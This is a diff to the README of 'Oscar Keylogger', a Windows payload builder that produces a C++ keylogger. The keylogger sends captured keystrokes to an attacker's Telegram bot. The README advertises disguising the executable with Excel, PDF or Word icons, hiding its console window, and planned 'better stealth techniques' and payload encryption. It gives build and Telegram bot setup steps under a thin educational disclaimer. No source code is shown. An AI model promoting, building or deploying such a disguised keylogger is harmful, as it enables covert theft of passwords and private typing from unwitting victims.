@@ -1,54 +1,71 @@
-# Oscar Keylogger
+<p align="center">
+  <img src="https://i.imgur.com/uAcYBFj.gif" width="850">
+</p>
+
+<h1 align="center">Oscar Keylogger</h1>
 
 <p align="center">
   <img src="https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge">
   <img src="https://img.shields.io/badge/language-Python%20%2B%20C++-orange?style=for-the-badge">
   <img src="https://img.shields.io/badge/status-Inactive-yellow?style=for-the-badge">
+  <img src="https://img.shields.io/badge/version-1.0-darkred?style=for-the-badge">
 </p>
 
-> ⚠️ This project is currently inactive and hasn't been updated for 1–2 years.  
-> A refreshed and improved version is planned in the future.
+<p align="center">
+  <i>"There's chaos in you."</i>
+</p>
 
-Oscar is a Windows-based payload generator that creates a customizable keylogging executable capable of sending captured keystrokes directly to a Telegram bot.
+---
+
+> ⚠️ This project has been inactive for around 1–2 years.  
+> A cleaner and improved version is planned for the future.
+
+Oscar is a customizable Windows payload generator capable of creating a lightweight keylogging executable that sends captured keystrokes directly to your Telegram bot.
 
 Built with:
-- **Python** → configuration & builder
-- **C++** → lightweight keylogging payload
+- **Python** → Builder & configuration interface
+- **C++** → Lightweight payload
 
 ---
 
 # Disclaimer
 
-This project is intended **strictly for educational purposes and authorized security testing**.
+This project is intended strictly for:
+- Educational purposes
+- Authorized security testing
+- Malware analysis research
 
-Unauthorized monitoring, keylogging, or access to systems you do not own or have permission to test is illegal and unethical.
+Unauthorized keylogging or monitoring of systems without explicit permission is illegal and unethical.
 
-The author assumes **no responsibility** for misuse or damages caused by this software.
+The author assumes no responsibility for misuse or damages caused by this software.
 
 ---
 
 # Why "Oscar"?
 
-When this project started, the *Moon Knight* series had just released and Oscar Isaac was everywhere.
+When this project was first written, the *Moon Knight* series had just dropped.
 
-The name stuck.
+Oscar Isaac was everywhere.
 
-No deep meaning. Just good timing and a cool vibe.
+The name stayed.
+
+No hidden meaning. Just a cool vibe from that era.
 
 ---
 
 # Features
 
-- Lightweight C++ keylogger payload
-- Telegram integration for live log delivery
+- Lightweight C++ payload
+- Telegram-based log delivery
 - Custom executable icons
   - Excel
   - PDF
   - Word
   - and more...
-- Hidden console window (stealth mode)
-- Easy configuration through Python interface
-- Simple payload generation process
+- Hidden console window
+- Easy payload generation
+- Python-powered configuration interface
+- Minimal and simple workflow
 
 ---
 
@@ -58,6 +75,7 @@ No deep meaning. Just good timing and a cool vibe.
 - Windows
 
 ## Dependencies
+
 - Python 3.8+
 - Git
 - MinGW (g++)
@@ -85,34 +103,41 @@ pip install -r requirements.txt
 
 ---
 
-## 3. Install MinGW & libcurl
+## 3. Install MinGW
 
-### Install MinGW
-Download:
-- https://www.mingw-w64.org/
+Download and install:
+https://www.mingw-w64.org/
+
+Make sure `g++` is added to PATH.
+
+Verify installation:
+
+```bash
+g++ --version
+```
 
 ---
 
-### Install vcpkg
+## 4. Install libcurl
+
+Clone vcpkg:
 
 ```bash
 git clone https://github.com/microsoft/vcpkg.git
 cd vcpkg
 ```
 
----
-
-### Install libcurl
+Install curl:
 
 ```bash
 ./vcpkg install curl
 ```
 
-Make sure both:
-- `g++`
-- `libcurl`
+Verify:
 
-are added to your system `PATH`.
+```bash
+pkg-config --modversion libcurl
+```
 
 ---
 
@@ -121,8 +146,8 @@ are added to your system `PATH`.
 ## 1. Create a Telegram Bot
 
 Use:
-- `@BotFather` → to obtain your bot token
-- `@userinfobot` → to get your Telegram chat ID
+- `@BotFather` → Get your Bot Token
+- `@userinfobot` → Get your Chat ID
 
 ---
 
@@ -138,7 +163,8 @@ You will be prompted to:
 - Enter Chat ID
 - Select executable icon
 
-Generated executable:
+Generated file:
+
 ```bash
 dist/<payload_name>.exe
 ```
@@ -197,11 +223,13 @@ pkg-config --modversion libcurl
 ---
 
 ## Icon not applied
+
 Make sure icon files exist inside the `icon/` directory.
 
 ---
 
 ## Telegram logs not sending
+
 Verify:
 - Bot Token
 - Chat ID
@@ -211,13 +239,14 @@ Verify:
 
 # Roadmap
 
-Planned future improvements:
+Planned future updates:
+
 - Linux support
 - Better stealth techniques
-- Improved payload builder
 - Cleaner UI
-- Encryption support
+- Payload encryption
 - Modular architecture
+- Builder improvements
 
 ---
 
